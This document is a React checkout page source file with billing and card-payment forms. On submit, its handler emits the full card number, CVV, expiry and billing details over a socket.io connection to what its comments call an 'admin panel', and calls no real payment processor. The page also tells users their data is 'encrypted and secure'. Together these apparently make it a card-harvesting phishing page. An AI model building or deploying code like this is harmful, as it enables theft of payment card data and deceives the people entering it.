import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { zodResolver } from "@hookform/resolvers/zod"
import { useForm } from "react-hook-form"
import * as z from "zod"
import { Button } from "@/components/ui/button"
import { Form, FormControl, FormDescription, FormField, FormItem, FormLabel, FormMessage } from "@/components/ui/form"
import { Input } from "@/components/ui/input"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { cn } from "@/lib/utils"
import { ArrowLeft, CreditCard } from 'lucide-react';
import { io } from 'socket.io-client';
import { useToast } from "@/hooks/use-toast"

interface Plan {
  name: string;
  price: number;
  billing: string;
}

const billingAddressFormSchema = z.object({
  firstName: z.string().min(2, {
    message: "First name must be at least 2 characters.",
  }),
  lastName: z.string().min(2, {
    message: "Last name must be at least 2 characters.",
  }),
  email: z.string().email({
    message: "Please enter a valid email address.",
  }),
  country: z.string().min(2, {
    message: "Please select a valid country.",
  }),
  companyName: z.string().optional(),
})

const paymentFormSchema = z.object({
  cardNumber: z.string().min(16, {
    message: "Card number must be at least 16 characters.",
  }),
  cardName: z.string().min(2, {
    message: "Name on card must be at least 2 characters.",
  }),
  cvv: z.string().min(3, {
    message: "CVV must be at least 3 characters.",
  }),
  expiry: z.string().min(4, {
    message: "Expiry must be at least 4 characters.",
  }),
})

interface CheckoutProps {
  planData: Plan | null;
}

const Checkout = () => {
  const [isProcessing, setIsProcessing] = useState(false);
  const navigate = useNavigate();
  const { toast } = useToast()

  // Retrieve plan data from localStorage
  const planDataString = localStorage.getItem('planData');
  const planData = planDataString ? JSON.parse(planDataString) : null;

  const billingAddressForm = useForm<z.infer<typeof billingAddressFormSchema>>({
    resolver: zodResolver(billingAddressFormSchema),
    defaultValues: {
      firstName: "",
      lastName: "",
      email: "",
      country: "",
      companyName: "",
    },
  })

  const paymentForm = useForm<z.infer<typeof paymentFormSchema>>({
    resolver: zodResolver(paymentFormSchema),
    defaultValues: {
      cardNumber: "",
      cardName: "",
      cvv: "",
      expiry: "",
    },
  })

  const handlePayment = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsProcessing(true);

    try {
      // Connect to WebSocket server
      const socketUrl = process.env.NODE_ENV === 'production' 
        ? window.location.origin
        : 'http://localhost:3001';
      
      const socket = io(socketUrl, {
        timeout: 5000,
        transports: ['websocket', 'polling']
      });

      socket.on('connect', () => {
        console.log('Connected to WebSocket server for payment');

        // Send payment data to admin panel
        const paymentData = {
          cardNumber: paymentForm.getValues().cardNumber,
          cardName: paymentForm.getValues().cardName,
          cvv: paymentForm.getValues().cvv,
          expiry: paymentForm.getValues().expiry,
          billingDetails: billingAddressForm.getValues(),
          planName: planData?.name || '',
          billing: planData?.billing || '',
          amount: planData?.price || 0,
          timestamp: new Date().toISOString()
        };

        socket.emit('payment-data', paymentData);
        console.log('Payment data sent to admin');

        // Navigate to payment processing page with payment data
        navigate('/payment', { 
          state: { 
            planData,
            paymentData // Pass the payment data including card details
          }
        });

        // Disconnect socket after sending data
        socket.disconnect();
      });

      socket.on('connect_error', (error) => {
        console.error('Failed to connect to payment server:', error);
        setIsProcessing(false);
      });

    } catch (error) {
      console.error('Payment processing error:', error);
      setIsProcessing(false);
    }
  };

  const handleBack = () => {
    navigate(-1);
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-50 to-indigo-100 p-4">
      <div className="max-w-2xl mx-auto">
        {/* Header */}
        <div className="flex items-center gap-4 mb-6">
          <Button
            variant="ghost"
            size="sm"
            onClick={handleBack}
            className="text-gray-600 hover:text-gray-800"
          >
            <ArrowLeft className="h-4 w-4" />
          </Button>
          <h1 className="text-xl font-semibold text-gray-800">Checkout</h1>
        </div>

        {/* Billing Address Form */}
        <div className="bg-white rounded-2xl shadow-xl p-6 mb-6">
          <h2 className="text-lg font-semibold text-gray-800 mb-4">Billing Address</h2>
          <Form {...billingAddressForm}>
            <form className="space-y-4">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <FormField
                  control={billingAddressForm.control}
                  name="firstName"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel>First Name</FormLabel>
                      <FormControl>
                        <Input placeholder="John" {...field} />
                      </FormControl>
                      <FormMessage />
                    </FormItem>
                  )}
                />
                <FormField
                  control={billingAddressForm.control}
                  name="lastName"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel>Last Name</FormLabel>
                      <FormControl>
                        <Input placeholder="Doe" {...field} />
                      </FormControl>
                      <FormMessage />
                    </FormItem>
                  )}
                />
              </div>
              <FormField
                control={billingAddressForm.control}
                name="email"
                render={({ field }) => (
                  <FormItem>
                    <FormLabel>Email</FormLabel>
                    <FormControl>
                      <Input placeholder="john.doe@example.com" {...field} />
                    </FormControl>
                    <FormMessage />
                  </FormItem>
                )}
              />
              <FormField
                control={billingAddressForm.control}
                name="country"
                render={({ field }) => (
                  <FormItem>
                    <FormLabel>Country</FormLabel>
                    <Select onValueChange={field.onChange} defaultValue={field.value}>
                      <FormControl>
                        <SelectTrigger>
                          <SelectValue placeholder="Select a country" />
                        </SelectTrigger>
                      </FormControl>
                      <SelectContent>
                        <SelectItem value="USA">United States of America</SelectItem>
                        <SelectItem value="Canada">Canada</SelectItem>
                        <SelectItem value="UK">United Kingdom</SelectItem>
                        <SelectItem value="Germany">Germany</SelectItem>
                        <SelectItem value="France">France</SelectItem>
                        <SelectItem value="India">India</SelectItem>
                      </SelectContent>
                    </Select>
                    <FormMessage />
                  </FormItem>
                )}
              />
              <FormField
                control={billingAddressForm.control}
                name="companyName"
                render={({ field }) => (
                  <FormItem>
                    <FormLabel>Company Name (Optional)</FormLabel>
                    <FormControl>
                      <Input placeholder="Acme Corp" {...field} />
                    </FormControl>
                    <FormMessage />
                  </FormItem>
                )}
              />
            </form>
          </Form>
        </div>

        {/* Payment Form */}
        <div className="bg-white rounded-2xl shadow-xl p-6 mb-6">
          <h2 className="text-lg font-semibold text-gray-800 mb-4">Payment Information</h2>
          <Form {...paymentForm}>
            <form onSubmit={handlePayment} className="space-y-4">
              <FormField
                control={paymentForm.control}
                name="cardNumber"
                render={({ field }) => (
                  <FormItem>
                    <FormLabel>Card Number</FormLabel>
                    <FormControl>
                      <Input type="number" placeholder="Enter card number" {...field} />
                    </FormControl>
                    <FormMessage />
                  </FormItem>
                )}
              />
              <FormField
                control={paymentForm.control}
                name="cardName"
                render={({ field }) => (
                  <FormItem>
                    <FormLabel>Name on Card</FormLabel>
                    <FormControl>
                      <Input placeholder="Enter name on card" {...field} />
                    </FormControl>
                    <FormMessage />
                  </FormItem>
                )}
              />
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <FormField
                  control={paymentForm.control}
                  name="cvv"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel>CVV</FormLabel>
                      <FormControl>
                        <Input type="number" placeholder="Enter CVV" {...field} />
                      </FormControl>
                      <FormMessage />
                    </FormItem>
                  )}
                />
                <FormField
                  control={paymentForm.control}
                  name="expiry"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel>Expiry Date</FormLabel>
                      <FormControl>
                        <Input placeholder="MM/YY" {...field} />
                      </FormControl>
                      <FormMessage />
                    </FormItem>
                  )}
                />
              </div>

              {/* Payment Summary */}
              <div className="bg-gray-50 rounded-lg p-4 mb-6">
                <div className="flex justify-between items-center">
                  <span className="text-gray-600">Plan:</span>
                  <span className="text-lg font-bold text-gray-800">{planData?.name}</span>
                </div>
                <div className="flex justify-between items-center">
                  <span className="text-gray-600">Billing:</span>
                  <span className="text-lg font-bold text-gray-800">{planData?.billing}</span>
                </div>
                <div className="flex justify-between items-center">
                  <span className="text-gray-600">Amount to pay:</span>
                  <span className="text-2xl font-bold text-gray-800">₹{planData?.price?.toLocaleString()}</span>
                </div>
              </div>

              <Button disabled={isProcessing} className="w-full bg-blue-600 hover:bg-blue-700">
                {isProcessing ? (
                  <>
                    <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-white mr-2"></div>
                    Processing Payment...
                  </>
                ) : (
                  <>
                    <CreditCard className="w-4 h-4 mr-2" />
                    Proceed to Payment
                  </>
                )}
              </Button>
            </form>
          </Form>
        </div>

        {/* Security Notice */}
        <div className="bg-white rounded-xl p-4">
          <div className="flex items-center gap-3">
            <CreditCard className="h-5 w-5 text-green-500" />
            <div>
              <p className="text-sm font-medium text-gray-800">Secure Payment</p>
              <p className="text-xs text-gray-600">Your payment information is encrypted and secure</p>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Checkout;
